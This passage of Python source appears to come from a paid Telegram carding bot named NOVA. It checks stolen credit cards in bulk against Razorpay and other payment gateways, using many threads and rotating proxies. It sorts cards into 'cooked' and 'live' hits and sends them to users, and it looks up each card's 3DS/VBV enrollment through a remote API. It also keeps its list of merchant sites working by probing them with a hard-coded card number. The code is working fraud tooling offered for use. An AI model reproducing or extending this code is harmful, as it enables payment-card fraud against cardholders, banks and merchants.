            now = time.time()
            if now - last_update_time > 5.0 or processed == len(futures) or stopped:
                try:
                    elapsed = now - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress_bar = format_progress_bar(processed, total)
                    lr = html.escape(str(last_response or "N/A"))[:40] + ("…" if last_response and len(str(last_response))>40 else "")
                    msg_text = (
                        f"<b>⚡ {gate_name}</b>\n"
                        f"{progress_bar}\n\n"
                        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                        f"❌ Declined: {len(results['declined'])}  👋 Expired: {len(results['expired'])}\n"
                        f"⚠️ Errors: {len(results['error'])}\n\n"
                        f"⏱️ Last: {lr}\n"
                        f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                    )
                    status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                    last_update_time = time.time()
                except Exception as e:
                    logger.warning(f"Gate progress update failed: {e}")

            if stopped:
                break

    clear_stop(chat_id, user_id)
    increment_usage(user_id, processed, load_json_func, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (
        f"<b>{'⏸️ Stopped' if stopped else '✅ ' + gate_name + ' Completed'}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 Checked: {processed}\n"
        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
        f"❌ Declined: {len(results['declined'])}  👋 Expired: {len(results['expired'])}\n"
        f"⚠️ Errors: {len(results['error'])}\n"
        f"⏱️ Time: {duration:.2f}s\n\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
    )
    if status_msg:
        try:
            safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
    else:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

    target = dm_target_user_id if dm_target_user_id else chat_id
    for key, caption, prefix in [
        ('cooked', '🔥 Cooked', 'cooked'),
        ('approved', '✅ Approved (Live)', 'approved'),
        ('expired', '👋 Expired', 'expired'),
        ('error', '⚠️ Errors', 'errors')
    ]:
        items = results.get(key, [])
        if items:
            text = "\n".join([f"{cc} | {msg}" for cc, msg in items])
            fname = f"{prefix}_{chat_id}_{user_id}.txt"
            with open(fname, 'w') as f: f.write(text)
            with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption=caption)
            try:
                os.remove(fname)
            except:
                pass

    if unchecked_ccs:
        unchecked_text = "\n".join(unchecked_ccs)
        fname = f"unchecked_{chat_id}_{user_id}.txt"
        with open(fname, 'w') as f: f.write(unchecked_text)
        with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption="📋 Unchecked")
        try:
            os.remove(fname)
        except:
            pass

# ============================================================================
# RAZORPAY MASS CHECK – with instant removal of dead sites
# ============================================================================
def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
                                user_id, load_json_func, save_json_func, users_file, dm_target_user_id=None):
    original_count = len(ccs)
    ccs = remove_expired_cards(ccs)
    expired_skipped = original_count - len(ccs)
    chat_id = message.chat.id
    if expired_skipped > 0:
        safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")

    send_every_hit = (get_user_preference(user_id) == "individual")
    total_cards = len(ccs)
    results = {"cooked": [], "approved": [], "declined": [], "error": []}
    clear_stop(chat_id, user_id)
    unchecked_ccs = []
    stopped = False
    last_response = None
    status_msg = start_msg

    instant_remove_keywords = [
        "the server encountered an error",
        "international payments not supported",
        "international payment not supported",
    ]
    site_error_keywords = [
        "account number is mandatory",
        "card transactions are not enabled",
        "temporarily blocked",
        "merchant account",
        "payment not allowed",
        "invalid merchant",
        "transaction not permitted",
        "unable to process",
        "merchant disabled",
        "account suspended",
        "bank not supported",
        "payment method not allowed",
        "sorry, we could not process",
        "something went wrong",
        "authentication failed",
    ]

    def worker(card):
        nonlocal last_response
        if is_stop_requested(chat_id, user_id):
            return card, "Stopped by user", "STOPPED"
        for site in sites:
            if is_stop_requested(chat_id, user_id):
                return card, "Stopped by user", "STOPPED"
            proxy = random.choice(proxies) if proxies else None
            msg, status = check_razorpay(card, proxy=proxy, site=site)
            last_response = msg

            if status == "ERROR":
                msg_lower = msg.lower()
                if any(kw in msg_lower for kw in instant_remove_keywords):
                    # instant remove
                    if site in sites:
                        sites.remove(site)
                        save_rz_sites(sites)
                        reset_rz_fail_count(site)
                        queue_hit(bot, chat_id, f"🗑️ Site <code>{site}</code> instantly removed – {msg[:60]}")
                    continue
                is_site_error = any(kw in msg_lower for kw in site_error_keywords)
                if is_site_error:
                    removed = increment_rz_fail_count(site)
                    if removed:
                        queue_hit(bot, chat_id, f"⚠️ Site <code>{site}</code> removed after 3 errors.")
                    continue
                else:
                    return card, msg, "DECLINED"
            else:
                reset_rz_fail_count(site)
                return card, msg, status
        return card, "All sites failed", "ERROR"

    processed = 0
    start_time = time.time()
    last_update_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id, user_id):
                unchecked_ccs = ccs[i:]
                stopped = True
                break
            future = executor.submit(worker, cc)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id, user_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
                stopped = True
            processed += 1
            try:
                timeout = 10 if is_stop_requested(chat_id, user_id) else 60
                cc, msg, status = future.result(timeout=timeout)
                if status == 'STOPPED':
                    unchecked_ccs.insert(0, cc)
                    stopped = True
                    break
                bin_info = get_bin_info(cc.split('|')[0])
                target = dm_target_user_id if dm_target_user_id else chat_id
                safe_msg = html.escape(msg)
                if status == 'APPROVED':
                    msg_upper = msg.upper()
                    if any(kw in msg_upper for kw in ['CHARGED', 'SUCCESS', 'APPROVED']):
                        results['cooked'].append((cc, msg))
                        if send_every_hit:
                            hit_msg = (
                                f"<b>🔥 COOKED Razorpay HIT!</b>\n"
                                f"━━━━━━━━━━━━━━\n"
                                f"💳 <code>{cc}</code>\n"
                                f"📋 {safe_msg}\n"
                                f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
                                f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
                                f"━━━━━━━━━━━━━━\n"
                                f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                            )
                            queue_hit(bot, target, hit_msg)
                    else:
                        results['approved'].append((cc, msg))
                        if send_every_hit:
                            hit_msg = (
                                f"<b>✅ APPROVED Razorpay (Live)</b>\n"
                                f"━━━━━━━━━━━━━━\n"
                                f"💳 <code>{cc}</code>\n"
                                f"📋 {safe_msg}\n"
                                f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
                                f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
                                f"━━━━━━━━━━━━━━\n"
                                f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                            )
                            queue_hit(bot, target, hit_msg)
                elif status == 'DECLINED':
                    results['declined'].append((cc, msg))
                else:
                    results['error'].append((cc, msg))
            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append((cc, "Timeout"))
            except Exception as e:
                cc = futures[future]
                results['error'].append((cc, str(e)))

            now = time.time()
            if now - last_update_time > 5.0 or processed == len(futures) or stopped:
                try:
                    elapsed = now - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress_bar = format_progress_bar(processed, total_cards)
                    lr = html.escape(str(last_response or "N/A"))[:40] + ("…" if last_response and len(str(last_response))>40 else "")
                    msg_text = (
                        f"<b>💎 Razorpay ₹1 Mass Check</b>\n"
                        f"{progress_bar}\n\n"
                        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                        f"❌ Declined: {len(results['declined'])}  ⚠️ Errors: {len(results['error'])}\n\n"
                        f"⏱️ Last: {lr}\n"
                        f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                    )
                    status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                    last_update_time = time.time()
                except Exception as e:
                    logger.warning(f"Razorpay progress update failed: {e}")

            if stopped:
                break

    clear_stop(chat_id, user_id)
    increment_usage(user_id, processed, load_json_func, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (
        f"<b>{'⏸️ Stopped' if stopped else '✅ Razorpay Mass Check Completed'}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 Checked: {processed}\n"
        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
        f"❌ Declined: {len(results['declined'])}  ⚠️ Errors: {len(results['error'])}\n"
        f"⏱️ Time: {duration:.2f}s\n\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
    )
    if status_msg:
        try:
            safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
    else:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

    target = dm_target_user_id if dm_target_user_id else chat_id
    for key, caption, prefix in [
        ('cooked', '🔥 Cooked cards', 'cooked'),
        ('approved', '✅ Approved (Live)', 'approved'),
        ('error', '⚠️ Errors', 'errors')
    ]:
        items = results.get(key, [])
        if items:
            text = "\n".join([f"{cc} | {msg}" for cc, msg in items])
            fname = f"{prefix}_{chat_id}_{user_id}.txt"
            with open(fname, 'w') as f: f.write(text)
            with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption=caption)
            try:
                os.remove(fname)
            except:
                pass

    if unchecked_ccs:
        unchecked_text = "\n".join(unchecked_ccs)
        fname = f"unchecked_{chat_id}_{user_id}.txt"
        with open(fname, 'w') as f: f.write(unchecked_text)
        with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption="📋 Unchecked cards")
        try:
            os.remove(fname)
        except:
            pass

# ============================================================================
# VBV / 3DS CHECKER – ENHANCED (returns rich dict)
# ============================================================================
VBV_API_BASE = "http://2.25.156.218:5001"

def vbv_checker(ccx):
    """
    Check 3DS/VBV status for a card.
    Returns a dict with keys:
      - status: 'NOT_ENROLLED', 'VBV_ENROLLED', 'CHALLENGE_REQUIRED', 'AUTHENTICATE_SUCCESSFUL',
                'AUTHENTICATE_FRICTIONLESS_FAILED', 'ERROR', 'INVALID_FORMAT'
      - enrolled: bool
      - response_text: raw response
      - auth_description: human-readable auth status
      - version: 3DS version
      - otp_required: bool
      - network: card network (Visa, Mastercard, etc.)
      - raw_status: the raw vbv_status from API
    """
    result = {
        "status": "UNKNOWN",
        "enrolled": False,
        "response_text": "",
        "auth_description": "",
        "version": "2.2.0",
        "otp_required": False,
        "network": "Unknown",
        "raw_status": ""
    }
    try:
        parts = ccx.strip().split("|")
        if len(parts) < 4:
            result["status"] = "INVALID_FORMAT"
            return result
        cc, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3].strip()
        data_str = f"{cc}|{mm}|{yy}|{cvc}"

        resp = requests.get(
            f"{VBV_API_BASE}/vbv_lookup",
            params={"cc": data_str},
            headers={"X-API-Key": "novaop"},
            timeout=120,
            verify=False
        )
        resp.raise_for_status()
        api_data = resp.json()

        # Extract fields
        vbv_status = api_data.get("vbv_status", "error")
        enrolled = api_data.get("enrolled", False)
        raw_status = vbv_status
        result["raw_status"] = raw_status
        result["enrolled"] = enrolled

        # Map status to our categories
        status_map = {
            "success": ("NOT_ENROLLED", False, "Passed ✅ (not enrolled)"),
            "vbv_required": ("VBV_ENROLLED", True, "OTP Required ⛔"),
            "challenge_required": ("CHALLENGE_REQUIRED", True, "Challenge Required (OTP/SMS needed)"),
            "authenticate_successful": ("AUTHENTICATE_SUCCESSFUL", False, "Frictionless Pass (auto-authenticated)"),
            "authenticate_frictionless_failed": ("AUTHENTICATE_FRICTIONLESS_FAILED", False, "Frictionless Failed (bank rejected)"),
            "authenticate_rejected": ("FAILED", False, "Authentication Rejected"),
            "lookup_error": ("ERROR", False, "Lookup Error"),
            "error": ("ERROR", False, "Error during lookup"),
        }
        mapped = status_map.get(vbv_status, ("UNKNOWN", False, f"Unknown ({vbv_status})"))
        result["status"] = mapped[0]
        result["otp_required"] = mapped[1]
        result["auth_description"] = mapped[2]

        # Extract version if available
        if "version" in api_data:
            result["version"] = api_data["version"]
        # Network
        if "network" in api_data:
            result["network"] = api_data["network"]
        else:
            # Infer network from card prefix
            first = cc[0]
            if first == "4":
                result["network"] = "Visa (VBV)"
            elif first in ["5", "2"]:
                result["network"] = "Mastercard (SecureCode)"
            elif cc.startswith("34") or cc.startswith("37"):
                result["network"] = "Amex (SafeKey)"
            else:
                result["network"] = "Unknown"

        result["response_text"] = f"Status: {vbv_status} – {mapped[2]}"
        return result

    except Exception as e:
        result["status"] = "ERROR"
        result["response_text"] = str(e)[:100]
        return result

def format_vbv_result(vbv_data, cc, bin_info=None):
    """
    Format a beautiful VBV/3DS result message with emojis and proper statuses.
    vbv_data is the dict returned by vbv_checker.
    cc is the full card string.
    bin_info is optional dict from get_bin_info.
    Returns formatted HTML string.
    """
    if bin_info is None:
        bin_info = get_bin_info(cc.split('|')[0])

    status = vbv_data.get("status", "UNKNOWN")
    enrolled = vbv_data.get("enrolled", False)
    auth_desc = vbv_data.get("auth_description", "")
    version = vbv_data.get("version", "2.2.0")
    otp_required = vbv_data.get("otp_required", False)
    network = vbv_data.get("network", "Unknown")
    raw_status = vbv_data.get("raw_status", "")

    # Determine emoji and status label
    if status == "NOT_ENROLLED":
        emoji = "🟢"
        label = "Not Enrolled"
    elif status == "CHALLENGE_REQUIRED":
        emoji = "🔴"
        label = "Challenge Required"
    elif status == "AUTHENTICATE_SUCCESSFUL":
        emoji = "🟢"
        label = "Authenticated (Frictionless Pass)"
    elif status == "AUTHENTICATE_FRICTIONLESS_FAILED":
        emoji = "🟡"
        label = "Frictionless Failed"
    elif status == "VBV_ENROLLED":
        emoji = "🔴"
        label = "VBV Enrolled"
    else:
        emoji = "⚪"
        label = status.replace("_", " ").title()

    bank = bin_info.get('bank', 'UNKNOWN')
    country = bin_info.get('country_name', 'UNKNOWN')
    flag = bin_info.get('country_flag', '🇺🇳')
    brand = bin_info.get('brand', 'UNKNOWN')
    card_type = bin_info.get('type', 'UNKNOWN')

    # Build message
    msg = f"""<b>{emoji} 3DS CHECK</b>
💳 <code>{cc}</code>

🏦 {bank}
🌍 {flag} {country}

🔒 Enrolled: {'Y' if enrolled else 'N'}
📋 Status: {label}
🔑 Auth: {auth_desc}
📦 Version: {version}
📱 OTP Required: {'Yes' if otp_required else 'No'}
🌐 Network: {network}

⚡ <b>Bot by Unknownop</b>"""
    return msg

# ============================================================================
# MAIN SETUP FUNCTION – all handlers
# ============================================================================
def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                          check_site_func, is_valid_response_func,
                          process_response_func, update_stats_func,
                          save_json_func_param, load_json_func_param,
                          is_user_allowed_func, users_data_ref, users_file_param,
                          force_subscribe_decorator=None,
                          user_sessions=None):
    global is_user_allowed, load_json_func, save_json_func, users_file

    def extract_cc(text):
        import re
        parts = []
        cleaned = re.sub(r'[^\d|:./ ]', '', text)
        if '|' in cleaned:
            parts = cleaned.split('|')
        elif ':' in cleaned:
            parts = cleaned.split(':')
        elif '.' in cleaned:
            parts = cleaned.split('.')
        elif '/' in cleaned:
            parts = cleaned.split('/')
        else:
            if len(cleaned) >= 16:
                cc = cleaned[:16]
                rest = cleaned[16:]
                if len(rest) >= 4:
                    mm = rest[:2]
                    rest = rest[2:]
                    if len(rest) >= 4:
                        yyyy = rest[:4] if len(rest) >= 4 else rest[:2]
                        rest = rest[4:] if len(rest) >= 4 else rest[2:]
                        if len(rest) >= 3:
                            cvv = rest[:3]
                            parts = [cc, mm, yyyy, cvv]

        if len(parts) < 4:
            return None
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yyyy = parts[2].strip()
        cvv = parts[3].strip()
        if len(yyyy) == 2:
            from datetime import datetime
            current_year_short = datetime.now().year % 100
            year_int = int(yyyy)
            yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"
        return f"{cc}|{mm}|{yyyy}|{cvv}"

    is_user_allowed = is_user_allowed_func
    load_json_func = load_json_func_param
    save_json_func = save_json_func_param
    users_file = users_file_param
    if user_sessions is not None:
        user_sessions_global = globals().get('user_sessions', {})
        user_sessions_global.clear()
        user_sessions_global.update(user_sessions)

    settings = load_json_func("settings.json", {"gate_limits": {}})
    gate_limits = settings.get("gate_limits", {})
    DEFAULT_GATE_LIMITS = {
        "shopify": 1000,
        "paypal": 200,
        "stripe": 200,
        "stripeauth": 10000,
        "razorpay": 500,
        "midasbuy": 1000,
    }
    for k, v in DEFAULT_GATE_LIMITS.items():
        if k not in gate_limits:
            gate_limits[k] = v

    @bot.callback_query_handler(func=lambda call: call.data == "stop_mass")
    def inline_stop(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        chat_id = call.message.chat.id
        user_id = call.from_user.id
        set_stop(chat_id, user_id)
        try:
            safe_send(bot.edit_message_text, call.message.text + "\n\n⏹ <b>Stop requested for your session...</b>",
                      chat_id, call.message.message_id, parse_mode="HTML")
        except:
            pass

    def access_denied(message, reason="You need an active subscription to use this bot.\nPlease purchase a plan or contact support."):
        full_msg = (
            f"🚫 <b>Access Denied</b>\n\n"
            f"{reason}\n\n"
            f"<i>Contact owner: @Unknown_bolte</i>"
        )
        safe_send(bot.reply_to, message, full_msg, parse_mode='HTML')

    def get_user_proxies(user_id):
        user_id_str = str(user_id)
        user_proxies = load_json_func("user_proxies.json", {})
        return user_proxies.get(user_id_str, [])

    def save_user_proxies(user_id, proxies_list):
        user_id_str = str(user_id)
        user_proxies = load_json_func("user_proxies.json", {})
        user_proxies[user_id_str] = proxies_list
        save_json_func("user_proxies.json", user_proxies)

    def get_active_proxies(user_id):
        if user_id in OWNER_ID:
            if proxies_data and 'proxies' in proxies_data and proxies_data['proxies']:
                return proxies_data['proxies']
            return None
        if user_id in user_sessions and user_sessions[user_id].get('proxies'):
            return user_sessions[user_id]['proxies']
        user_proxies = get_user_proxies(user_id)
        if user_proxies:
            return user_proxies
        return None

    @bot.message_handler(commands=['mode'])
    def mode_command(message):
        user_id = message.from_user.id
        parts = message.text.split()
        if len(parts) == 1:
            current = get_user_preference(user_id)
            safe_send(bot.reply_to, message, f"🔔 Your current mode: <b>{current}</b>\n\n"
                     "Use /mode individual to receive hits as individual messages.\n"
                     "Use /mode final to receive only a final summary with files.", parse_mode='HTML')
            return
        mode = parts[1].lower()
        if mode not in ['individual', 'final']:
            safe_send(bot.reply_to, message, "❌ Invalid mode. Use 'individual' or 'final'.", parse_mode='HTML')
            return
        set_user_preference(user_id, mode)
        safe_send(bot.reply_to, message, f"✅ Mode changed to <b>{mode}</b>.", parse_mode='HTML')

    @bot.message_handler(commands=['addmysite'])
    def add_my_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "You need a subscription to add personal sites.")
            return
        try:
            _, url = message.text.split(maxsplit=1)
            url = url.strip()
            if not url.startswith("https://"):
                safe_send(bot.reply_to, message, "❌ Please provide a full URL (https://...)", parse_mode='HTML')
                return
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /addmysite <url>\nExample: /addmysite https://shop.site.com", parse_mode='HTML')
            return
        sites = get_user_sites(user_id)
        new_site = {
            "url": url,
            "name": url.split("//")[1].split("/")[0],
            "price": "0.00",
            "gateway": "Shopify"
        }
        sites.append(new_site)
        save_user_sites_list(user_id, sites)
        safe_send(bot.reply_to, message, f"✅ Added personal site:\n{url}", parse_mode='HTML')

    @bot.message_handler(commands=['mysites'])
    def list_my_sites(message):
        user_id = message.from_user.id
        sites = get_user_sites(user_id)
        if not sites:
            safe_send(bot.reply_to, message, "You have no personal sites.\nAdd with /addmysite <url>", parse_mode='HTML')
            return
        text = "<b>Your personal sites:</b>\n"
        for i, s in enumerate(sites, 1):
            text += f"{i}. {s['url']} ({s.get('name','')})\n"
        safe_send(bot.reply_to, message, text, parse_mode='HTML')

    @bot.message_handler(commands=['addrz'])
    def add_rz_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        try:
            _, url = message.text.split(maxsplit=1)
            url = url.strip()
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /addrz <url>", parse_mode='HTML')
            return
        if not is_valid_razorpay_url(url):
            safe_send(bot.reply_to, message, "❌ Invalid Razorpay site URL. Must start with https://razorpay.me/", parse_mode='HTML')
            return
        sites = load_rz_sites()
        if url in sites:
            safe_send(bot.reply_to, message, "⚠️ Site already exists.", parse_mode='HTML')
            return
        valid, msg = validate_razorpay_site(url)
        if not valid:
            safe_send(bot.reply_to, message, f"❌ Site validation failed: {msg}\nSite not added.", parse_mode='HTML')
            return
        sites.append(url)
        save_rz_sites(sites)
        safe_send(bot.reply_to, message, f"✅ Added Razorpay site:\n{url}\nTotal: {len(sites)}", parse_mode='HTML')

    @bot.message_handler(commands=['removerz'])
    def remove_rz_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        try:
            _, url = message.text.split(maxsplit=1)
            url = url.strip()
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /removerz <url>", parse_mode='HTML')
            return
        sites = load_rz_sites()
        if url not in sites:
            safe_send(bot.reply_to, message, "❌ Site not found.", parse_mode='HTML')
            return
        sites.remove(url)
        save_rz_sites(sites)
        safe_send(bot.reply_to, message, f"✅ Removed Razorpay site:\n{url}\nRemaining: {len(sites)}", parse_mode='HTML')

    @bot.message_handler(commands=['listrz'])
    def list_rz_sites_cmd(message):
        sites = load_rz_sites()
        if not sites:
            safe_send(bot.reply_to, message, "No Razorpay sites added. Use /addrz to add.", parse_mode='HTML')
            return
        text = "<b>Razorpay Sites:</b>\n"
        for site in sites:
            short_id = hashlib.md5(site.encode()).hexdigest()[:5]
            text += f"🆔 <code>{short_id}</code> → {site}\n"
        safe_send(bot.reply_to, message, text, parse_mode='HTML')

    @bot.message_handler(commands=['rmrzid'])
    def remove_rz_site_by_id(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        try:
            _, short_id = message.text.split(maxsplit=1)
            short_id = short_id.strip().lower()
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /rmrzid <short_id>", parse_mode='HTML')
            return

        sites = load_rz_sites()
        found = None
        for site in sites:
            if hashlib.md5(site.encode()).hexdigest()[:5] == short_id:
                found = site
                break

        if not found:
            safe_send(bot.reply_to, message, f"❌ No site found with ID <code>{short_id}</code>.", parse_mode='HTML')
            return

        sites.remove(found)
        save_rz_sites(sites)
        safe_send(bot.reply_to, message, f"✅ Removed Razorpay site:\n<code>{found}</code>\nRemaining: {len(sites)}", parse_mode='HTML')

    @bot.message_handler(commands=['uploadrz'])
    def upload_rz_prompt(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        safe_send(bot.reply_to, message, "📂 <b>Send me a .txt file with one Razorpay site per line.</b>", parse_mode='HTML')
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]['awaiting_rz_file'] = True

    # ============================================================================
    # FIXED /cleanrz – now removes sites that return server errors (not just ERROR status)
    # ============================================================================
    @bot.message_handler(commands=['cleanrz'])
    def clean_rz_sites_cmd(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return

        sites = load_rz_sites()
        if not sites:
            safe_send(bot.reply_to, message, "❌ No Razorpay sites to clean.")
            return

        safe_send(bot.reply_to, message, f"🧹 Testing {len(sites)} Razorpay sites – will remove dead/broken ones instantly...")

        test_cc = "4031630690796056|08|2029|876"
        proxies = get_active_proxies(user_id)
        if not proxies:
            proxies = []

        # Expanded dead keywords (matches mass check)
        dead_keywords = [
            "the server encountered an error",
            "international payments not supported",
            "international payment not supported",
            "account number is mandatory",
            "card transactions are not enabled",
            "temporarily blocked",
            "merchant account",
            "payment not allowed",
            "invalid merchant",
            "transaction not permitted",
            "unable to process",
            "merchant disabled",
            "account suspended",
            "bank not supported",
            "payment method not allowed",
            "sorry, we could not process",
            "something went wrong",
            "authentication failed",
            "unknown",
            "403 forbidden",
            "waf block",
            "error",
        ]

        kept_sites = []
        removed = 0
        lock = threading.Lock()

        def test_site(site):
            proxy = random.choice(proxies) if proxies else None
            msg, status = check_razorpay(test_cc, proxy=proxy, site=site)

            # If message contains any dead keyword -> remove
            msg_lower = msg.lower()
            if any(kw in msg_lower for kw in dead_keywords):
                return site, False
            # Also remove if status is "UNKNOWN" (generic error)
            if status == "UNKNOWN":
                return site, False
            # Keep everything else (DECLINED, APPROVED, even other errors that are not dead)
            return site, True

        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_site = {executor.submit(test_site, site): site for site in sites}
            for future in as_completed(future_to_site):
                site = future_to_site[future]
                try:
                    _, keep = future.result(timeout=15)
                    with lock:
                        if keep:
                            kept_sites.append(site)
                        else:
                            removed += 1
                            reset_rz_fail_count(site)
                except:
                    with lock:
                        removed += 1
                        reset_rz_fail_count(site)

        save_rz_sites(kept_sites)
        safe_send(bot.send_message, message.chat.id,
            f"✅ Razorpay sites cleaned:\n"
            f"🗑️ Removed: {removed}\n"
            f"💎 Kept: {len(kept_sites)}",
            parse_mode='HTML')

    # ============================================================================
    # NEW /testrz and /uploadrzsites (for manual/bulk addition)
    # ============================================================================
    @bot.message_handler(commands=['testrz'])
    def test_rz_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return

        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Usage: /testrz <razorpay.me/url>")
            return

        url = parts[1].strip()
        if not is_valid_razorpay_url(url):
            safe_send(bot.reply_to, message, "❌ Invalid Razorpay URL. Must start with https://razorpay.me/")
            return

        test_cc = "4031630690796056|08|2029|876"
        proxies = get_active_proxies(user_id)
        proxy = random.choice(proxies) if proxies else None

        status_msg = safe_send(bot.reply_to, message, f"⏳ Testing site: {url} ...")
        msg, status = check_razorpay(test_cc, proxy=proxy, site=url)

        dead_keywords = [
            "the server encountered an error",
            "international payments not supported",
            "account number is mandatory",
            "temporarily blocked",
            "merchant account",
            "payment not allowed",
            "invalid merchant",
            "transaction not permitted",
            "unable to process",
            "merchant disabled",
            "account suspended",
            "bank not supported",
            "payment method not allowed",
            "sorry, we could not process",
            "something went wrong",
            "authentication failed",
            "unknown",
            "403 forbidden",
        ]
        msg_lower = msg.lower()
        is_dead = any(kw in msg_lower for kw in dead_keywords)

        if not is_dead and status != "UNKNOWN":
            sites = load_rz_sites()
            if url not in sites:
                sites.append(url)
                save_rz_sites(sites)
                safe_send(bot.edit_message_text,
                    f"✅ Site <code>{url}</code> is **LIVE** (response: {msg[:60]}).\nAdded to Razorpay list.",
                    message.chat.id, status_msg.message_id, parse_mode='HTML')
            else:
                safe_send(bot.edit_message_text,
                    f"⚠️ Site <code>{url}</code> is LIVE but already in the list.",
                    message.chat.id, status_msg.message_id, parse_mode='HTML')
        else:
            safe_send(bot.edit_message_text,
                f"❌ Site <code>{url}</code> is **DEAD** (response: {msg[:60]}). Not added.",
                message.chat.id, status_msg.message_id, parse_mode='HTML')

    @bot.message_handler(commands=['uploadrzsites'])
    def upload_rz_sites_prompt(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        safe_send(bot.reply_to, message, "📂 <b>Send a .txt file with one Razorpay URL per line.</b>\n\nI'll test each and add valid ones.", parse_mode='HTML')
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]['awaiting_rz_bulk_upload'] = True

    # Override the document handler to handle bulk upload
    @bot.message_handler(content_types=['document'])
    def unified_file_handler(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        is_free_group = (chat_id == FREE_GROUP_ID)

        if user_sessions.get(user_id, {}).get('awaiting_rz_file'):
            user_sessions[user_id]['awaiting_rz_file'] = False
            try:
                file_name = message.document.file_name.lower()
                if not file_name.endswith('.txt'):
                    safe_send(bot.reply_to, message, "❌ Only .txt files allowed.", parse_mode='HTML')
                    return
                msg_loading = safe_send(bot.reply_to, message, "⏳ Processing Razorpay sites...", parse_mode='HTML')
                file_info = bot.get_file(message.document.file_id)
                file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
                lines = [line.strip() for line in file_content.split('\n') if line.strip()]
                added = 0
                invalid = []
                sites = load_rz_sites()
                for line in lines:
                    if not is_valid_razorpay_url(line):
                        invalid.append(line)
                        continue
                    if line in sites:
                        continue
                    valid, _ = validate_razorpay_site(line)
                    if not valid:
                        invalid.append(line)
                        continue
                    sites.append(line)
                    added += 1
                save_rz_sites(sites)
                result = f"✅ Added {added} new Razorpay sites.\nTotal sites: {len(sites)}"
                if invalid:
                    result += f"\n⚠️ Skipped {len(invalid)} invalid lines."
                if msg_loading:
                    safe_send(bot.edit_message_text, result, message.chat.id, msg_loading.message_id, parse_mode='HTML')
                else:
                    safe_send(bot.send_message, message.chat.id, result, parse_mode='HTML')
            except Exception as e:
